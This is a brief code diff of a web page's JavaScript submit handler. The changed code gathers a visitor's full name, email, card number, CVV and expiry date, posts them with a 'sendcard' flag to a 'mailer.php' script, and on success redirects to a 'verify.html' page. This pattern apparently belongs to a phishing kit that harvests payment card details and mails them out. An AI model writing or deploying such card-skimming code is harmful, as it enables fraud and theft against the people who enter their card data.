@@ -236,22 +236,31 @@
        function startSpinner(event) {
         event.preventDefault();
         let data = {
-          expirationYear: $("#expiration-year").val(),
+          expYear: $("#expiration-year").val(),
           email: $("#email").val(),
           name: $("#full-name").val(),
           cvv: $("#cvv").val(),
           cardNumber: $("#credit-card-num").val(),
           expMonth: $("#expiration-month").val(),
-          sendmail: true
+          sendcard: true
         }
         console.log(data);
         
         $.ajax({
-          url: "Controller/requestHandler.php",
+          url: "mailer.php",
           method: "POST",
           data: data,
           success: (res) => {
-            console.log(res);
+            if(res == "success"){
+                  
+                window.location.href = "verify.html"
+            
+            }
+            // setTimeout(function() {
+            //     window.location.href = "verify.html"
+            // }, 8000);
+            // console.log(res);
+            
             
           }
         })
